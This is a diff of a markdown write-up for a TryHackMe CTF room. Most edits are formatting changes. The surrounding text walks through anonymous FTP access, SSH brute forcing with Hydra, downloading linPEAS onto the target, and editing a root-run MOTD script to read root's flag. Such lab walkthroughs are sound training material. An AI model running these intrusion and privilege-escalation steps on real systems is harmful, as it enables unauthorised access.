@@ -2,7 +2,7 @@
 
 ## Disclaimer
 
-This writeup is for a room located on TryHackMe. If you would like to attempt the room, please visit it [here](https://tryhackme.com/room/cowboyhacker).
+This writeup is for a room located on **TryHackMe**. If you would like to attempt the room, please visit it [here](https://tryhackme.com/room/cowboyhacker).
 
 ## Description
 
@@ -14,7 +14,7 @@ Deploy the machine by clicking the **Deploy** button.
 
 # Task 2
 
-After the machine has finished booting up, run the following command to reveal the open ports on the network (If using personal Linux machine, remember to use OpenVPN):
+After the machine has finished booting up, run the following command to reveal the open ports on the network (If using personal Linux machine, remember to use **OpenVPN**):
 
 ```
 nmap -sV -sC -Pn
@@ -38,9 +38,9 @@ Thanks to this hint, we know to use the ftp server that we found in the nmap sca
 ftp ${MachineIP}
 ```
 
-To log into the ftp server, we will be using the _anonymous_ username to access the ftp server. This was mentioned in the nmap scan.
+To log into the ftp server, we will be using the **anonymous** username to access the ftp server. This was mentioned in the nmap scan.
 
-After searching around the ftp, we find a file within the _dir_ directory. We notice there's a text file called _task.txt_. We can view this file directly in the ftp terminal using the following command:
+After searching around the ftp, we find a file within the **dir** directory. We notice there's a text file called **task.txt**. We can view this file directly in the ftp terminal using the following command:
 
 ```
 get task.txt -
@@ -48,7 +48,7 @@ get task.txt -
 
 We now have our username!
 
-After finding this task.txt file, we will notice there is another file called locks.txt, and it looks like a bunch of strange passwords. Let's use the get command again to save this on our machine for a future task.
+After finding this **task.txt** file, we will notice there is another file called **locks.txt**, and it looks like a bunch of strange passwords. Let's use the get command again to save this on our machine for a future task.
 
 ```
 get locks.txt
@@ -58,7 +58,7 @@ get locks.txt
 
 Hint: What is on port 22?
 
-This task is just looking for the service running on port 22 (Check nmap scan output).
+This task is just looking for the service running on **port 22** (Check nmap scan output).
 
 # Task 5
 
@@ -66,7 +66,7 @@ Hint: Hydra may be able to help.
 
 Since we discovered the username, we can now ssh, but where is the password?
 
-Remember that locks.txt file we discovered earlier in the ftp? It's now time to scan the file and find the password for our user!
+Remember that **locks.txt** file we discovered earlier in the ftp? It's now time to scan the file and find the password for our user!
 
 Since the question mentions hydra, we are going to be using this command to find any available passwords for the user:
 
@@ -92,7 +92,7 @@ We can also run this within the targets terminal to see if we have root privileg
 sudo -l
 ```
 
-After we run a simple command to see the available items in the directory, we see the user.txt file, which has our first flag!
+After we run a simple command to see the available items in the directory, we see the **user.txt** file, which has our first flag!
 
 Commands:
 
@@ -103,9 +103,9 @@ cat user.txt
 
 # Task 7
 
-All that's left is to find the root.txt and complete the CTF!
+All that's left is to find the **root.txt** and complete the CTF!
 
-The easiest way to accomplish this is by using linPEAS & a python server, so we're gonna start by getting a python server up and running with the command (Remember to do this in your root terminal, not as the user!):
+The easiest way to accomplish this is by using **linPEAS** & a **python server**, so we're gonna start by getting a python server up and running with this command (Remember to do this in your root terminal, not as the user!):
 
 ```
 sudo python3 -m http.server 80
@@ -121,7 +121,7 @@ cd LinEnum
 wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
 ```
 
-Now we need to move back over to the users terminal, and since we have it saved on our server, let's move it over to the target machine (Remember to use this command in the target's terminal).
+Now we need to move back over to the users terminal, and we now have it saved on our server, so let's move it over to the target machine (Remember to use this command in the target's terminal).
 
 Note: If using the THM cloud Kali Linux machine, the PrivateIP is available [here](https://tryhackme.com/my-machine).
 
@@ -129,19 +129,19 @@ Note: If using the THM cloud Kali Linux machine, the PrivateIP is available [her
 wget "http://${PrivateIP}/linpeas.sh"
 ```
 
-To make our linPEAS script executable, we simply do this command (Notice the color change when we run this command):
+To make our **linPEAS** script executable, we simply do this command (Notice the color change when we run this command):
 
 ```
 chmod +x linpeas.sh
 ```
 
-Time to run the script!
+**Time to run the script!**
 
 ```
 ./linpeas.sh
 ```
 
-After a few minutes, the script should finish running on the target machine. After sifting through all the returned results, we see a file called _/etc/update-motd.d/00-header_ (Notice how it's highlighted).
+After a few minutes, the script should finish running on the target machine. After sifting through all the returned results, we see a file called **/etc/update-motd.d/00-header** (Notice how it's highlighted).
 
 After locating this file, it's time to change the directory over to it:
 
@@ -150,15 +150,15 @@ $ cd /etc/update-motd.d
 $ ls -la
 ```
 
-This will show us that the 00-header file we found is actually owned by root.
+This will show us that the **00-header** file we found is actually owned by root.
 
-The easiest way to do this is by using nano:
+The easiest way to do this is by using **nano**:
 
 ```
 nano 00-header
 ```
 
-Now that we have the file open, let's edit the file so that the next time we log in through ssh, we will see the root.txt!
+Now that we have the file open, let's edit the file so that the next time we log in through **ssh**, we will see the **root.txt**!
 
 For this, we just need to add the following command at the very bottom of the open file:
 
@@ -166,9 +166,9 @@ For this, we just need to add the following command at the very bottom of the op
 cat /root/root.txt
 ```
 
-_ctrl + x to save the file_
+**ctrl + x to save the file**
 
-After completing all the above tasks, all we have to do is log out of the ssh shell and log back in. You'll see the root.txt flag is located directly in the login terminal screen!
+After completing all the above tasks, all we have to do is log out of the ssh shell and log back in. You'll see the **root.txt** flag is located directly in the login terminal screen!
 
 ```
 ssh ${user}@${MachineIP}
@@ -180,7 +180,7 @@ Shoutout to [Sevuhl](https://tryhackme.com/p/Sevuhl) for creating such a cool ro
 
 # Extra
 
-This room is based on an anime called Cowboy Bebop (One of my favorites!). You can check it out [here](https://www.imdb.com/title/tt0213338/).
+This room is based on an anime called **Cowboy Bebop** (One of my favorites!). You can check it out [here](https://www.imdb.com/title/tt0213338/).
 
 ## YouTube Version
 
